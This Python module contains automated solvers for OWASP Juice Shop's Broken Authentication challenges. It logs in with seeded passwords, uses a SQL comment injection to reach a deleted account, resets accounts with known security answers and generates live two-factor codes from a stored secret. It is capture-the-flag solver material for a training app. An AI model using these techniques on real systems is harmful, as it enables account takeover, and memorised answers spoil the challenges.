"""Broken Authentication solvers (all 9). Verified against
data/static/users.yml (real seeded plaintext passwords and security-question
answers for this exact fixed dataset), routes/login.ts
(verifyPreLoginChallenges/verifyPostLoginChallenges), routes/changePassword.ts,
routes/resetPassword.ts, and routes/2fa.ts (fetched 2026-08-09). None of these
need SQL injection — Juice Shop's own seed data or its documented "weak"
flows are the intended solutions, and the server-side checks confirm that."""
import pyotp

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- routes/login.ts verifyPreLoginChallenges: solved by literally logging
# in with the seeded admin credentials (admin/admin123) — the challenge is
# about the password being guessable, not about bypassing auth. ---

@register("weakPasswordChallenge", "Broken Authentication", 2)
def solve_weak_password(ctx: SolverContext) -> None:
    ctx.client.login(f"admin@{DOMAIN}", "admin123")


# --- routes/login.ts verifyPreLoginChallenges: Bjoern's Google account in
# the seed data has its real password stored in users.yml too. ---

@register("oauthUserPasswordChallenge", "Broken Authentication", 4)
def solve_oauth_user_password(ctx: SolverContext) -> None:
    ctx.client.login("bjoern.kimminich@gmail.com", "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=")


# --- routes/login.ts verifyPostLoginChallenges: solved by user.id ===
# users.chris.id after a successful login, regardless of technique. Chris's
# seeded row is soft-deleted (deletedFlag: true in users.yml) and the login
# query requires `deletedAt IS NULL`, so his real password ("uss enterprise")
# alone 401s — same comment-based bypass as loginAdminChallenge is needed to
# drop that clause too. ---

@register("ghostLoginChallenge", "Broken Authentication", 3)
def solve_ghost_login(ctx: SolverContext) -> None:
    ctx.client.login(f"chris.pike@{DOMAIN}'--", "irrelevant")


# --- routes/changePassword.ts: `challengeUtils.solveIf(
# changePasswordBenderChallenge, () => user.id === 3 && !currentPassword &&
# user.password === hash('slurmCl4ssic'))`. Log in as Bender with his real
# seeded password, then call change-password with only `new`/`repeat` (no
# `current`). ---

@register("changePasswordBenderChallenge", "Broken Authentication", 5)
def solve_change_password_bender(ctx: SolverContext) -> None:
    ctx.client.login(f"bender@{DOMAIN}", "OhG0dPlease1nsertLiquor!")
    ctx.client.get(
        "/rest/user/change-password",
        params={"new": "slurmCl4ssic", "repeat": "slurmCl4ssic"},
    ).raise_for_status()


# --- routes/resetPassword.ts verifySecurityAnswerChallenges: each of these
# checks the exact user id AND the exact security answer string. The answers
# below are the real seeded values from data/static/users.yml, not guesses. ---

def _reset_password(ctx: SolverContext, email: str, answer: str, new_password: str) -> None:
    ctx.client.post(
        "/rest/user/reset-password",
        json={"email": email, "answer": answer, "new": new_password, "repeat": new_password},
    ).raise_for_status()


@register("resetPasswordJimChallenge", "Broken Authentication", 3)
def solve_reset_password_jim(ctx: SolverContext) -> None:
    _reset_password(ctx, f"jim@{DOMAIN}", "Samuel", "NewJimPassword1!")


@register("resetPasswordBenderChallenge", "Broken Authentication", 4)
def solve_reset_password_bender(ctx: SolverContext) -> None:
    _reset_password(ctx, f"bender@{DOMAIN}", "Stop'n'Drop", "NewBenderPassword1!")


@register("resetPasswordBjoernChallenge", "Broken Authentication", 5)
def solve_reset_password_bjoern(ctx: SolverContext) -> None:
    _reset_password(ctx, f"bjoern@{DOMAIN}", "West-2082", "NewBjoernPassword1!")


@register("resetPasswordBjoernOwaspChallenge", "Broken Authentication", 3)
def solve_reset_password_bjoern_owasp(ctx: SolverContext) -> None:
    _reset_password(ctx, "bjoern@owasp.org", "Zaya", "NewBjoernOwaspPassword1!")


# --- routes/2fa.ts verify(): solved when the second-factor login for
# wurstbrot succeeds. His TOTP secret is stored in plaintext in
# data/static/users.yml (the challenge is precisely that: "unsafe secret
# storage"), so pyotp can generate a valid live code with it. ---

@register("twoFactorAuthUnsafeSecretStorageChallenge", "Broken Authentication", 5)
def solve_two_factor_auth(ctx: SolverContext) -> None:
    login_resp = ctx.client.login(f"wurstbrot@{DOMAIN}", "EinBelegtesBrotMitSchinkenSCHINKEN!")
    data = login_resp.json()
    tmp_token = data["data"]["tmpToken"]
    totp = pyotp.TOTP("IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH")
    ctx.client.verify_2fa(tmp_token, totp.now())
